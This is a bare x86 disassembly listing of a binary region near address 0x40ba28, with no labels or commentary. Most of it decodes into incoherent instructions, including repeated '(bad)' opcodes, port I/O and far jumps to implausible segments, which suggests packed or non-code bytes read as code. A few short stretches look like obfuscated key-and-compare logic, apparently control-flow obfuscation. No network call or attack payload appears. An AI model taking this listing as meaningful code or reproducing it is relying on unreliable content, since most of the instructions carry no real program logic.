  40ba28:	jecxz  0x40ba01
  40ba2a:	push   eax
  40ba2b:	fild   WORD PTR [bp+di+0x3278]
  40ba30:	mov    gs,edi
  40ba32:	imul   eax,DWORD PTR [edi-0x1cd43019],0xffffff91
  40ba39:	xchg   DWORD PTR [ebx],esp
  40ba3b:	sahf   
  40ba3c:	ret    0xd944
  40ba3f:	mov    WORD PTR [eax+0x33],ss
  40ba42:	dec    edi
  40ba43:	data16 and al,0x57
  40ba46:	mov    ebx,0x99ce864a
  40ba4b:	sahf   
  40ba4c:	ret    
  40ba4d:	lock xor ecx,DWORD PTR [esi+0x7f9d6ae3]
  40ba54:	and    al,0xcd
  40ba56:	adc    eax,0x1520b20a
  40ba5b:	ja     0x40b9e3
  40ba5d:	push   ecx
  40ba5e:	fwait
  40ba5f:	sar    DWORD PTR [edi-0x77],1
  40ba62:	fisub  DWORD PTR [ebx-0x5c619430]
  40ba68:	cdq    
  40ba69:	lea    ebp,[ecx+edi*8]
  40ba6c:	loop   0x40baa4
  40ba6e:	(bad)  
  40ba6f:	mov    eax,0x395eb7d7
  40ba74:	jbe    0x40ba54
  40ba76:	popf   
  40ba77:	test   BYTE PTR [ebp+esi*1-0x3c],bl
  40ba7b:	sbb    BYTE PTR [eax-0x4cf7fa0b],al
  40ba81:	xchg   edx,eax
  40ba82:	retf   0xec3d
  40ba85:	cs pop ds
  40ba87:	pop    eax
  40ba88:	or     DWORD PTR [ebx-0x7b6c92d7],edx
  40ba8e:	cwde   
  40ba8f:	ja     0x40ba11
  40ba91:	mov    ds:0x77e6e576,al
  40ba96:	sub    ebx,ebp
  40ba98:	xor    al,0x7a
  40ba9a:	jno    0x40bb12
  40ba9c:	out    dx,eax
  40ba9d:	add    eax,DWORD PTR [esi+esi*8-0x5ca4667f]
  40baa4:	dec    ebx
  40baa5:	loope  0x40baef
  40baa7:	xchg   ebp,eax
  40baa8:	mov    eax,0x2cf333d
  40baad:	icebp  
  40baae:	stos   BYTE PTR es:[edi],al
  40baaf:	mov    al,ds:0x9e926477
  40bab4:	xchg   ebx,eax
  40bab5:	out    0xc1,al
  40bab7:	cmp    ch,dl
  40bab9:	jl     0x40ba85
  40babb:	inc    edx
  40babc:	sbb    dh,BYTE PTR [edi+0x780d313b]
  40bac2:	enter  0xe3d8,0xe2
  40bac6:	or     bl,ah
  40bac8:	(bad)  
  40bac9:	cmp    eax,0x177031a5
  40bace:	inc    edx
  40bacf:	mul    DWORD PTR [esi]
  40bad1:	cwde   
  40bad2:	stc    
  40bad3:	(bad)  
  40bad4:	jle    0x40ba5d
  40bad6:	loope  0x40bab8
  40bad8:	loope  0x40bb42
  40bada:	xor    BYTE PTR [edx],ch
  40badc:	adc    BYTE PTR [edi],dl
  40bade:	iret   
  40badf:	dec    edx
  40bae0:	into   
  40bae1:	mov    BYTE PTR [eax+edx*8+0x78],cl
  40bae5:	or     ebp,ebx
  40bae7:	push   ecx
  40bae8:	xchg   esi,eax
  40bae9:	cmp    ch,BYTE PTR [eax]
  40baeb:	xchg   esi,eax
  40baec:	(bad)  
  40baed:	fcom   QWORD PTR [edx-0x3f]
  40baf0:	jae    0x40bb12
  40baf2:	inc    eax
  40baf3:	popf   
  40baf4:	stos   DWORD PTR es:[edi],eax
  40baf5:	mov    BYTE PTR [ebp-0x63c4dd98],ah
  40bafb:	sbb    eax,0x51fa8160
  40bb01:	fisub  WORD PTR [edi+0x24133a03]
  40bb07:	xchg   ebp,eax
  40bb08:	pushf  
  40bb09:	jne    0x40bb03
  40bb0b:	push   edx
  40bb0c:	push   ds
  40bb0d:	add    ah,BYTE PTR [edi]
  40bb0f:	push   ebx
  40bb10:	pop    eax
  40bb11:	xor    ecx,esp
  40bb13:	(bad)  
  40bb14:	sub    BYTE PTR [edi],ch
  40bb16:	retf   0x2eec
  40bb19:	or     BYTE PTR [ebx+0x45],al
  40bb1c:	into   
  40bb1d:	pusha  
  40bb1e:	mov    ds:0x67978d16,eax
  40bb23:	jge    0x40babf
  40bb25:	mov    eax,ds:0x1de6be54
  40bb2a:	sbb    esi,DWORD PTR [edi]
  40bb2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb2e:	lds    ebx,FWORD PTR [esi+edi*2-0x3f549cf0]
  40bb35:	in     eax,dx
  40bb36:	(bad)  
  40bb37:	jne    0x40baba
  40bb39:	jnp    0x40bb17
  40bb3b:	out    dx,al
  40bb3c:	rol    BYTE PTR [ebx+ecx*4-0x38],0xb4
  40bb41:	je     0x79a91adc
  40bb47:	push   edx
  40bb48:	(bad)  
  40bb49:	call   FWORD PTR [esp+ebp*1+0x5d99220d]
  40bb50:	jp     0x40bb7b
  40bb52:	mov    ch,0x3f
  40bb54:	pop    ds
  40bb55:	jns    0x40baf8
  40bb57:	dec    ecx
  40bb58:	in     eax,0x38
  40bb5a:	push   0xbc6fa45e
  40bb5f:	adc    dl,BYTE PTR [ecx-0x10]
  40bb62:	clc    
  40bb63:	in     eax,dx
  40bb64:	xchg   ecx,eax
  40bb65:	idiv   bh
  40bb67:	mov    DWORD PTR [edx-0x1a],edx
  40bb6a:	inc    ebp
  40bb6b:	jmp    ecx
  40bb6d:	out    dx,eax
  40bb6e:	and    eax,0x8ef5c372
  40bb73:	and    eax,0xe76bd328
  40bb78:	mov    bh,0x69
  40bb7a:	pop    esp
  40bb7b:	je     0x40bbd1
  40bb7d:	popa   
  40bb7e:	and    dh,BYTE PTR [ebx]
  40bb80:	les    edi,FWORD PTR ds:0x887d1e94
  40bb86:	jmp    0x40bb1c
  40bb88:	out    dx,eax
  40bb89:	dec    ecx
  40bb8a:	mov    eax,0xded5df90
  40bb8f:	xor    edx,edx
  40bb91:	cs push ecx
  40bb93:	loope  0x40bb75
  40bb95:	cmp    esi,0xffffffac
  40bb98:	push   ebp
  40bb99:	rcr    esp,0x69
  40bb9c:	std    
  40bb9d:	push   0x85232f2a
  40bba2:	adc    BYTE PTR [edx+0x2ce38d08],bl
  40bba8:	test   DWORD PTR [edx+0x66645cc2],0x400bae0a
  40bbb2:	into   
  40bbb3:	gs push ebx
  40bbb5:	mov    ebx,0x40c9d321
  40bbba:	and    dh,BYTE PTR fs:[edx+0x14c75beb]
  40bbc1:	(bad)  
  40bbc2:	clc    
  40bbc3:	(bad)  
  40bbc4:	ja     0x40bc1b
  40bbc6:	hlt    
  40bbc7:	repnz les edi,FWORD PTR ds:0x8ba4d854
  40bbce:	pop    eax
  40bbcf:	mov    ah,bl
  40bbd1:	lods   al,BYTE PTR ds:[esi]
  40bbd2:	shr    BYTE PTR [ebp+0x63],1
  40bbd5:	inc    eax
  40bbd6:	or     edx,eax
  40bbd8:	arpl   WORD PTR [ebx],ax
  40bbda:	clc    
  40bbdb:	cmp    BYTE PTR ds:0x2a504e0f,ch
  40bbe1:	cdq    
  40bbe2:	and    al,0xb5
  40bbe4:	mov    ebp,0x19e0fd4a
  40bbe9:	xor    al,0xb
  40bbeb:	sbb    esi,DWORD PTR [edi+edi*2]
  40bbee:	fild   DWORD PTR [ebp+0xf]
  40bbf1:	jno    0x40bbf5
  40bbf3:	xchg   edx,eax
  40bbf4:	cmc    
  40bbf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbf6:	inc    eax
  40bbf7:	imul   esp,DWORD PTR [edi-0x4dce253d],0x1ab9c187
  40bc01:	push   esp
  40bc02:	push   ebx
  40bc03:	jno    0x40bc7d
  40bc05:	out    dx,al
  40bc06:	pop    ebp
  40bc07:	mov    eax,0x351724d2
  40bc0c:	dec    edi
  40bc0d:	loope  0x40bc39
  40bc0f:	mov    ebx,0x5dd775fc
  40bc14:	jp     0x40bc1a
  40bc16:	jle    0x40bc2b
  40bc18:	inc    eax
  40bc19:	jge    0x40bb9e
  40bc1b:	mov    ds:0xe6a3b6fb,eax
  40bc20:	cld    
  40bc21:	ja     0x40bca1
  40bc23:	and    BYTE PTR [eax+0x4],dh
  40bc26:	push   DWORD PTR [ebp-0x3e]
  40bc29:	xchg   esp,eax
  40bc2a:	jmp    0x40bbfb
  40bc2c:	les    ebx,FWORD PTR [ebx]
  40bc2e:	cs leave 
  40bc30:	inc    ebx
  40bc31:	aam    0xd6
  40bc33:	xchg   ebx,eax
  40bc34:	mov    dh,0xe8
  40bc36:	js     0x40bcb6
  40bc38:	inc    ebx
  40bc39:	sub    edx,DWORD PTR [ecx]
  40bc3b:	(bad)  
  40bc3c:	mov    al,0x4e
  40bc3e:	iret   
  40bc3f:	mov    al,ds:0x44743458
  40bc44:	(bad)  
  40bc46:	outs   dx,BYTE PTR ds:[esi]
  40bc48:	popf   
  40bc49:	pusha  
  40bc4a:	pop    ds
  40bc4b:	mov    ds:0xac35ce1c,al
  40bc50:	and    DWORD PTR [ecx],esp
  40bc52:	sbb    eax,ebx
  40bc54:	pop    es
  40bc55:	outs   dx,DWORD PTR ds:[esi]
  40bc56:	or     eax,ebx
  40bc58:	cli    
  40bc59:	mov    dh,0x75
  40bc5b:	xor    ecx,eax
  40bc5d:	pop    ebp
  40bc5e:	mov    ebp,0x57e4fee8
  40bc63:	scas   eax,DWORD PTR es:[edi]
  40bc64:	loop   0x40bbec
  40bc66:	jnp    0x40bbe9
  40bc68:	cs dec esp
  40bc6a:	and    ecx,0x5e
  40bc6d:	out    0x91,eax
  40bc6f:	cmp    ebp,DWORD PTR [eax]
  40bc71:	cmp    esp,DWORD PTR [esi]
  40bc73:	push   ebp
  40bc74:	mov    bl,0xe
  40bc76:	or     DWORD PTR [esi+0x1444836b],esi
  40bc7c:	div    BYTE PTR [ebp+0x64981c4c]
  40bc82:	ja     0x40bc70
  40bc84:	push   edi
  40bc85:	retf   0xe9f
  40bc88:	rol    bh,cl
  40bc8a:	mov    ds:0x80f1279d,eax
  40bc8f:	in     eax,dx
  40bc90:	push   ecx
  40bc91:	pop    eax
  40bc92:	adc    eax,0x2217e004
  40bc97:	stos   DWORD PTR es:[edi],eax
  40bc98:	mov    eax,ds:0x3c2fd6c4
  40bc9d:	pop    dx
  40bc9f:	mov    esp,fs
  40bca1:	cs fucomp st(1)
  40bca4:	pusha  
  40bca5:	pop    ss
  40bca6:	out    0xd6,al
  40bca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bca9:	sub    DWORD PTR [esi],0xae80e122
  40bcaf:	jg     0x40bd01
  40bcb1:	push   esp
  40bcb2:	setp   BYTE PTR [esi+0x5e]
  40bcb6:	cmp    ebp,DWORD PTR [eax+0x22]
  40bcb9:	xchg   ebx,eax
  40bcba:	data16 mov es,WORD PTR [ebp+0x55]
  40bcbe:	scas   al,BYTE PTR es:[edi]
  40bcbf:	rcl    DWORD PTR [edx+eax*8-0x17],0x89
  40bcc4:	sub    edx,DWORD PTR [ebx-0x31]
  40bcc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcc8:	push   ds
  40bcc9:	enter  0x664,0xae
  40bccd:	mov    dl,0xfa
  40bccf:	scas   eax,DWORD PTR es:[edi]
  40bcd0:	fimul  WORD PTR [ebp-0xf]
  40bcd3:	das    
  40bcd4:	stos   DWORD PTR es:[edi],eax
  40bcd5:	dec    eax
  40bcd6:	inc    esi
  40bcd7:	hlt    
  40bcd8:	aam    0xdd
  40bcda:	jp     0x40bd53
  40bcdc:	loopne 0x40bcf0
  40bcde:	jae    0x40bd49
  40bce0:	sbb    bh,BYTE PTR ds:0x572c1e6a
  40bce6:	push   edi
  40bce7:	jnp    0x40bd12
  40bce9:	pop    edx
  40bcea:	imul   eax,edi,0xffffffb1
  40bced:	jmp    0xaf0c57cb
  40bcf2:	and    eax,0xf05d8bb2
  40bcf7:	sub    ebx,edi
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    bh,BYTE PTR [ecx-0x70ebcb6f]
  40bd43:	(bad)  
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bdb2
  40bd4b:	dec    ebp
  40bd4c:	das    
  40bd4d:	push   ebx
  40bd4e:	aaa    
  40bd4f:	dec    eax
  40bd50:	bound  ecx,QWORD PTR [ebp+0x3f]
  40bd53:	xchg   esi,eax
  40bd54:	and    ebx,DWORD PTR [edx+0x6fc21ea1]
  40bd5a:	int3   
  40bd5b:	pop    edx
  40bd5c:	push   ss
  40bd5d:	push   edi
  40bd5e:	xchg   edi,eax
  40bd5f:	cld    
  40bd60:	int3   
  40bd61:	ret    
  40bd62:	in     eax,dx
  40bd63:	je     0x40bd26
  40bd65:	sti    
  40bd66:	hlt    
  40bd67:	lods   al,BYTE PTR ds:[esi]
  40bd68:	adc    al,0x65
  40bd6a:	push   ebp
  40bd6b:	test   al,0x2b
  40bd6d:	imul   edi,ebx,0x3a7373a7
  40bd73:	fnsave ds:0xaceb7e5c
  40bd79:	pop    esp
  40bd7a:	sub    ebp,DWORD PTR [esi]
  40bd7c:	dec    esp
  40bd7d:	lea    edx,[esi+0xb]
  40bd80:	push   eax
  40bd81:	ins    BYTE PTR es:[edi],dx
  40bd82:	add    DWORD PTR ds:0x49709a2a,edi
  40bd88:	jmp    0x40bd43
  40bd8a:	inc    esi
  40bd8b:	mov    al,ds:0x93344011
  40bd90:	push   cs
  40bd91:	jns    0x40bde6
  40bd93:	(bad)  
  40bd95:	pop    ss
  40bd96:	out    dx,eax
  40bd97:	mov    edx,0x8f4ea5ee
  40bd9c:	call   FWORD PTR [eax-0x62ffae5d]
  40bda2:	and    DWORD PTR [esi-0x4a5662f1],0x0
  40bda9:	retf   0xeabb
  40bdac:	xchg   DWORD PTR [edx],ecx
  40bdae:	sub    ch,ch
  40bdb0:	cs pop ebx
  40bdb2:	sbb    al,0x63
  40bdb4:	xchg   edi,eax
  40bdb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdb6:	pop    eax
  40bdb7:	bound  ebx,QWORD PTR [ebx-0x51ead9f2]
  40bdbd:	or     eax,0x4463a16e
  40bdc2:	or     edx,DWORD PTR [edi]
  40bdc4:	mov    esi,0x10869246
  40bdc9:	adc    al,0x77
  40bdcb:	xor    eax,0xf6bfe815
  40bdd0:	call   0xfe851cec
  40bdd5:	pushf  
  40bdd6:	push   ecx
  40bdd7:	pop    ss
  40bdd8:	add    BYTE PTR [edi-0x57],dh
  40bddb:	jge    0x40be13
  40bddd:	std    
  40bdde:	out    dx,al
  40bddf:	pop    es
  40bde0:	fdiv   DWORD PTR ds:0x7faa0a21
  40bde6:	xchg   BYTE PTR [ecx+0x15],cl
  40bde9:	aad    0xc6
  40bdeb:	adc    esi,DWORD PTR [eax+0x5b99ff75]
  40bdf1:	jmp    0x40bd73
  40bdf3:	xor    al,0x2e
  40bdf5:	mov    edi,0x9c12ca09
  40bdfb:	jl     0x40be74
  40bdfd:	inc    ebx
  40bdfe:	loopne 0x40be27
  40be00:	arpl   WORD PTR [eax-0xde1a2ee],si
  40be06:	aas    
  40be07:	enter  0x52a4,0xf6
  40be0b:	std    
  40be0c:	add    ebp,DWORD PTR [edi+esi*8]
  40be0f:	and    DWORD PTR [ebp+0x6e],edi
  40be12:	sbb    edx,ebp
  40be14:	xor    esp,edx
  40be16:	aam    0xca
  40be18:	shl    DWORD PTR [edi+0x351662ab],cl
  40be1e:	jae    0x40be02
  40be20:	outs   dx,BYTE PTR ds:[esi]
  40be21:	xlat   BYTE PTR ds:[ebx]
  40be22:	addr16 xor al,0xd6
  40be25:	lock cli 
  40be27:	mov    esi,0x9d8ee5cf
  40be2c:	lds    eax,FWORD PTR [ebx-0x5d]
  40be2f:	mov    edi,0xe2d7d1cb
  40be34:	les    ebp,FWORD PTR [ecx+0x202a1978]
  40be3a:	enter  0x6465,0x49
  40be3e:	iret   
  40be3f:	mov    ds:0x45445bf2,al
  40be44:	mov    al,ds:0x9c1dfe29
  40be49:	inc    ebx
  40be4a:	mov    ch,0x65
  40be4c:	xlat   BYTE PTR ds:[ebx]
  40be4d:	repnz inc eax
  40be4f:	mov    eax,0x6fe71d1
  40be54:	mov    dl,0xea
  40be56:	xor    eax,0xf9cebb5f
  40be5b:	xchg   DWORD PTR [edi],esi
  40be5d:	fdiv   QWORD PTR [ecx+0x4661b564]
  40be63:	mov    DWORD PTR [edx+0x12],ebp
  40be66:	fcom   QWORD PTR [esi]
  40be68:	sub    esp,edx
  40be6a:	inc    esp
  40be6b:	das    
  40be6c:	add    eax,0x6ef18ec4
  40be71:	in     eax,0x1
  40be73:	ins    DWORD PTR es:[edi],dx
  40be74:	int3   
  40be75:	and    ah,BYTE PTR [edi+0x6a]
  40be78:	add    ecx,DWORD PTR [ebx]
  40be7a:	addr16 mov esi,0x5487e631
  40be80:	out    0xa9,al
  40be82:	adc    ebx,esp
  40be84:	fistp  QWORD PTR [edi+0x25]
  40be87:	and    esp,DWORD PTR [eax+0x6d5bfff0]
  40be8d:	or     DWORD PTR [si],0x73a006f2
  40be94:	movq   QWORD PTR [eax-0x6e],mm2
  40be98:	aam    0xc1
  40be9a:	call   0x624c743b
  40be9f:	xchg   edx,eax
  40bea0:	in     al,dx
  40bea1:	ins    BYTE PTR es:[edi],dx
  40bea2:	adc    dh,BYTE PTR [ebx-0x59757b46]
  40bea8:	sbb    BYTE PTR [ecx-0x24c2f70e],bl
  40beae:	mov    bl,0x44
  40beb0:	pusha  
  40beb1:	add    DWORD PTR [edi-0x4a],eax
  40beb4:	jae    0x40be62
  40beb6:	xor    eax,edx
  40beb8:	das    
  40beb9:	inc    eax
  40beba:	arpl   WORD PTR [ebp+0x51700ad5],di
  40bec0:	daa    
  40bec1:	aam    0x6f
  40bec3:	dec    eax
  40bec4:	mov    cs,ecx
  40bec6:	xchg   edx,eax
  40bec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bec8:	es ins BYTE PTR es:[edi],dx
  40beca:	lahf   
  40becb:	mov    WORD PTR [ebx+0x57],cs
  40bece:	add    dl,BYTE PTR [edx]
  40bed0:	cmp    eax,0x13389d99
  40bed5:	jmp    0x66d9:0x26bf6010
  40bedc:	out    0x48,eax
  40bede:	mov    dl,0xe1
  40bee0:	daa    
  40bee1:	mov    ebp,0x6a7c216b
  40bee6:	(bad)  
  40bee7:	retf   0x1a1b
  40beea:	clc    
  40beeb:	ja     0x40bedc
  40beed:	sub    ch,0x34
  40bef0:	sub    DWORD PTR [esi+0x1b],eax
  40bef3:	pop    ds
  40bef4:	(bad)  
  40bef5:	(bad)  
  40bef7:	pcmpgtw mm7,QWORD PTR [ebx-0x31]
  40befb:	ret    
  40befc:	jmp    0xb15b:0x5db9ce78
  40bf03:	js     0x40be88
  40bf05:	xchg   edx,eax
  40bf06:	fidiv  WORD PTR [edx-0x195a1c5b]
  40bf0c:	je     0x40bf4e
  40bf0e:	cmp    eax,0x11dcd6c6
  40bf13:	jns    0x40befa
  40bf15:	pop    edx
  40bf16:	rcr    ch,cl
  40bf18:	shl    BYTE PTR [ecx],1
  40bf1a:	and    edi,ebx
  40bf1c:	push   0x3f27f6f0
  40bf21:	add    al,0x7a
  40bf23:	je     0x40befd
  40bf25:	sbb    dh,dh
  40bf27:	test   BYTE PTR [ecx+eiz*1+0x7b],ah
  40bf2b:	shl    DWORD PTR [esi+0x16],cl
  40bf2e:	lock push edx
  40bf30:	add    bh,ch
  40bf32:	dec    ebp
  40bf33:	mov    bl,bh
  40bf35:	mov    edx,0x9ea168d
  40bf3a:	cmp    ebx,DWORD PTR [eax]
  40bf3c:	pop    esi
  40bf3d:	test   eax,ecx
  40bf3f:	adc    cl,bl
  40bf41:	(bad)  
  40bf42:	jp     0x40bf9b
  40bf44:	das    
  40bf45:	jle    0x40bf22
  40bf47:	sbb    ah,ah
  40bf49:	or     ecx,DWORD PTR [ebx+0x36]
  40bf4c:	pop    eax
  40bf4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf4e:	mov    ah,0x6d
  40bf50:	sti    
  40bf51:	nop
  40bf52:	dec    eax
  40bf53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf54:	xor    DWORD PTR [ebp+0x5f],esi
  40bf57:	sbb    al,0x51
  40bf59:	or     bl,BYTE PTR ds:0x64fc4593
  40bf5f:	iret   
  40bf60:	int3   
  40bf61:	in     eax,0x5c
  40bf63:	in     eax,dx
  40bf64:	pop    es
  40bf65:	xchg   DWORD PTR ds:0x8f19cd2a,ebx
  40bf6b:	icebp  
  40bf6c:	mov    ebx,0xfc694aa2
  40bf71:	jbe    0x40bf57
  40bf73:	fninit 
  40bf75:	leave  
  40bf76:	mov    dh,0xdc
  40bf78:	jae    0x40bf77
  40bf7a:	jbe    0x40bfad
  40bf7c:	mov    bl,0x84
  40bf7e:	ds in  eax,dx
  40bf80:	push   eax
  40bf81:	dec    BYTE PTR [ebx+eax*2]
  40bf84:	and    eax,0x9a123e00
  40bf89:	pop    ss
  40bf8a:	imul   ecx,DWORD PTR [edx+0x41adcce6],0xffffff9a
  40bf91:	pop    esp
  40bf92:	test   DWORD PTR [eax+eiz*1],esi
  40bf95:	es ss jmp 0x437b:0xf6e8a687
  40bf9e:	(bad)  
  40bf9f:	test   eax,0xe7ab0ab6
  40bfa4:	jl     0x40bf73
  40bfa6:	pop    ds
  40bfa7:	(bad)  
  40bfa8:	outs   dx,DWORD PTR ds:[esi]
  40bfa9:	mov    ebp,0x17d148a1
  40bfae:	enter  0xb789,0x69
  40bfb2:	shr    BYTE PTR [ebx],0x6f
  40bfb5:	mov    eax,0x5d8019c2
  40bfba:	pop    es
  40bfbb:	imul   ecx,edi,0xcbf7095f
  40bfc1:	lods   al,BYTE PTR ds:[esi]
  40bfc2:	pusha  
  40bfc3:	xchg   BYTE PTR [eax-0x4d],dh
  40bfc6:	out    0xa7,al
  40bfc8:	sbb    DWORD PTR [ebx],edx
  40bfca:	gs sbb al,0xf5
  40bfcd:	repnz push 0xe5e2641c
  40bfd3:	push   esp
  40bfd4:	jmp    0xd62e:0x9cea77de
  40bfdb:	sub    ch,BYTE PTR [edi-0x6a]
  40bfde:	sub    DWORD PTR [ebx-0x1d5a61ec],0x3d80469
  40bfe8:	jo     0x40bfba
  40bfea:	cdq    
  40bfeb:	inc    eax
  40bfec:	ja     0x40c05b
  40bfee:	js     0x40bfcc
  40bff0:	fcmovnu st,st(1)
  40bff2:	mov    eax,ds:0x6abf5bed
  40bff7:	mov    esp,0xd553d19b
  40bffc:	push   ebx
  40bffd:	adc    ebx,DWORD PTR ds:0xebae979f
  40c003:	push   cs
  40c004:	sub    ah,BYTE PTR [ecx-0x54]
  40c007:	mov    ebx,0xf8943556
  40c00c:	mov    al,ds:0x436be091
  40c011:	pushf  
  40c012:	sub    dh,BYTE PTR [ebx-0x1f]
  40c015:	in     al,dx
  40c016:	enter  0x4bd9,0x9d
  40c01a:	lods   al,BYTE PTR ds:[esi]
  40c01b:	sti    
  40c01c:	xor    al,0x22
  40c01e:	push   0xffffffdd
  40c020:	xchg   ebp,eax
  40c021:	loop   0x40c01b
  40c023:	lock fistp QWORD PTR [ebx]
  40c026:	aas    
  40c027:	cdq    
  40c028:	and    DWORD PTR [edi],ebp
  40c02a:	pop    ebp
  40c02b:	jmp    0x40c017
  40c02d:	sti    
  40c02e:	sbb    dl,cl
  40c030:	rol    BYTE PTR [edi+0x75],cl
  40c033:	dec    ecx
  40c034:	ss jne 0x40bfba
  40c037:	mov    dl,BYTE PTR [edi+0x65]
  40c03a:	inc    ebx
  40c03b:	push   0xffffffa4
  40c03d:	mov    esp,0xb0b8c58d
  40c042:	fld    TBYTE PTR [ebp-0x6fb333eb]
  40c048:	mov    al,ds:0xdfa27925
  40c04d:	add    BYTE PTR [eax+0x79d42a08],0x41
  40c054:	in     al,dx
  40c055:	int3   
  40c056:	imul   esi,eax,0x50
  40c059:	push   ebx
  40c05a:	or     BYTE PTR [edi-0x46],ah
  40c05d:	mov    esi,0xf7978218
  40c062:	das    
  40c063:	add    BYTE PTR [eax-0x58c4a40e],ah
  40c069:	in     eax,dx
  40c06a:	push   ebp
  40c06b:	ret    0x59ab
  40c06e:	push   esi
  40c06f:	test   BYTE PTR [edi-0x5a7e09d3],ah
  40c075:	ss xor eax,0x62160509
  40c07b:	in     eax,0xf4
  40c07d:	inc    edx
  40c07e:	jmp    FWORD PTR [eax]
  40c080:	sub    edi,DWORD PTR [edi-0xa94f21f]
  40c086:	loop   0x40c09a
  40c088:	repnz pop ebp
  40c08a:	not    DWORD PTR [eax-0x53]
  40c08d:	call   0xd453:0x2fd4d6b3
  40c094:	add    eax,0xb856d69e
  40c099:	xchg   esp,eax
  40c09a:	std    
  40c09b:	pusha  
  40c09c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c09d:	jle    0x40c067
  40c09f:	adc    BYTE PTR [esi],dh
  40c0a1:	jo     0x40c024
  40c0a3:	sbb    al,0xd3
  40c0a5:	xchg   edx,eax
  40c0a6:	adc    ch,BYTE PTR [ebx]
  40c0a8:	push   ss
  40c0a9:	or     eax,0x5e19b2c4
  40c0ae:	mov    eax,ds:0xbf612176
  40c0b3:	xchg   edx,eax
  40c0b4:	outs   dx,DWORD PTR ds:[esi]
  40c0b5:	inc    ecx
  40c0b6:	int3   
  40c0b7:	mov    esp,0x110aa1f4
  40c0bc:	adc    al,0x2f
  40c0be:	pop    edx
  40c0bf:	nop
  40c0c0:	push   eax
  40c0c1:	shl    ebp,0x8
  40c0c4:	loop   0x40c127
  40c0c6:	fdivr  QWORD PTR [ebx+0x79]
  40c0c9:	retf   
  40c0ca:	sbb    esi,eax
  40c0cc:	mov    ebp,DWORD PTR [ecx]
  40c0ce:	push   eax
  40c0cf:	jns    0x40c114
  40c0d1:	inc    ebp
  40c0d2:	clc    
  40c0d3:	shr    ch,cl
  40c0d5:	pusha  
  40c0d6:	pop    esp
  40c0d7:	jne    0x40c07f
  40c0d9:	mov    dh,0xbc
  40c0db:	or     al,0xe3
  40c0dd:	and    cl,BYTE PTR [eax+0x6b98f2b1]
  40c0e3:	dec    ebx
  40c0e4:	xor    ecx,eax
  40c0e6:	jp     0x40c0b4
  40c0e8:	jns    0x40c06f
  40c0ea:	mov    bl,0x8b
  40c0ec:	push   ebp
  40c0ed:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	mov    cx,WORD PTR ds:[ebx]
  40c144:	xor    al,0x9a
  40c146:	das    
  40c147:	mov    esi,DWORD PTR cs:[eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c1bf
  40c150:	inc    esp
  40c151:	pop    si
  40c154:	xchg   edx,eax
  40c155:	mov    al,0x17
  40c157:	sub    ah,BYTE PTR [edx+0x65]
  40c15a:	(bad)  
  40c15c:	shl    ch,cl
  40c15e:	ret    
  40c15f:	mov    esi,0xf2d1f2a2
  40c164:	add    al,BYTE PTR ds:0x2aaaca6
  40c16a:	ret    
  40c16b:	sbb    eax,esi
  40c16d:	xor    DWORD PTR [edi+0x34c09cd1],edx
  40c173:	(bad)  
  40c174:	jo     0x40c1f2
  40c176:	or     al,0xff
  40c178:	icebp  
  40c179:	jmp    FWORD PTR [edi-0x5889af88]
  40c17f:	sti    
  40c180:	cld    
  40c181:	in     al,0xc8
  40c183:	jo     0x40c116
  40c185:	mov    ds:0xb38742e1,eax
  40c18a:	and    DWORD PTR [edi-0x6dadefb5],ecx
  40c190:	jecxz  0x40c1eb
  40c192:	add    DWORD PTR [edx-0x52],0x22
  40c196:	push   ds
  40c197:	jnp    0x40c160
  40c199:	jg     0x40c203
  40c19b:	sub    eax,0xce30e19b
  40c1a0:	xchg   esi,eax
  40c1a1:	out    0xc7,eax
